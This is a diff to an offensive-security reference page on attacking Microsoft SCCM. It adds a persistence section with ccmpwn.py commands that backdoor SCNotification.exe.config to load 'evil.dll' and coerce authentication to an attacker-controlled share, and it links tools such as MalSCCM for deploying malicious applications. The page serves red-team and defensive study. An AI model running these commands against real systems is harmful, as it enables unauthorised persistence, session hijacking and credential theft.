@@ -1,12 +1,11 @@
 # Deployment - SCCM
 
-## Application Deployment
+## SCCM Application Deployment
 
 > SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.
 
-* [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
-* [MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)
-
+* [PowerShellMafia/PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
+* [nettitude/MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)
 
 * Using **SharpSCCM**
   ```ps1
@@ -75,7 +74,10 @@
   ```
 
 
-## Configuration Manager
+## SCCM Configuration Manager
+
+* [subat0mik/Misconfiguration-Manager/MisconfigurationManager.ps1](https://raw.githubusercontent.com/subat0mik/Misconfiguration-Manager/main/MisconfigurationManager.ps1)
+
 
 ### CRED-1 Retrieve credentials via PXE boot media
 
@@ -214,6 +216,25 @@ From a remote machine.
     ```
 
 
+## SCCM Persistence
+
+* [mandiant/CcmPwn](https://github.com/mandiant/CcmPwn) - lateral movement script that leverages the CcmExec service to remotely hijack user sessions.
+
+CcmExec is a service native to SCCM Windows clients that is executed on every interactive session. This technique requires Adminsitrator privileges on the targeted machine.
+
+* Backdoor the `SCNotification.exe.config` to load your DLL
+
+    ```ps1
+    python3 ccmpwn.py domain/user:password@workstation.domain.local exec -dll evil.dll -config exploit.config
+    ```
+
+* Malicious config to force `SCNotification.exe` to load a file from an attacker-controlled file share
+
+    ```ps1
+    python3 ccmpwn.py domain/user:password@workstation.domain.local coerce -computer 10.10.10.10
+    ```
+
+
 ## References
 
 * [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
@@ -223,3 +244,8 @@ From a remote machine.
 * [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
 * [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
 * [Misconfiguration Manager: Overlooked and Overprivileged - Duane Michael - Mar 5, 2024](https://posts.specterops.io/misconfiguration-manager-overlooked-and-overprivileged-70983b8f350d)
+* [SeeSeeYouExec: Windows Session Hijacking via CcmExec - Andrew Oliveau](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec?hl=en)
+* [SCCM / MECM LAB - Part 0x0 - mayfly - Mar 23, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x0/)
+* [SCCM / MECM LAB - Part 0x1 - Recon and PXE - mayfly - Mar 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x1/)
+* [SCCM / MECM LAB - Part 0x2 - Low user - mayfly - Mar 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x2/)
+* [SCCM / MECM LAB - Part 0x3 - Admin User - mayfly - Apr 3, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x3/)
